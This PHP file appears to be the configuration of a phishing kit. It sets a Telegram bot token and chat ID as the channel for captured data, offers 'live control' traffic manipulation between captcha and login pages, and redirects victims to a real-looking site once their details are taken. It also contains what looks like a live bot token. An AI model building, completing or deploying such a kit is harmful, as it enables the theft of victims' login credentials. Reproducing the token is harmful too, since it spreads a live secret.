<?php 

$telegram = array(
    'bot_token' => '6829789550:AAG8OqdhNDo21_nNAM3dr9u1ZmMXgHlax7A', // telegram bot token
    'chat_id' => '2075919717', // telegram chat id
);

$live_control = array(
    'access_manipulation' => true, // true or false [true to manipulate traffic from live control, false is to directly go to access auto]
    'access_auto' => 'default', // captcha or default [if access manipulation is turned to false means when somebody access your page can lead to access auto if to go direct to page or captcha first]
    'access_to' => 'login', // home or signin
);

$html = array(
    'header' => true,
    'footer' => true,
);

$redirect['success'] = 'https://yloud.com/';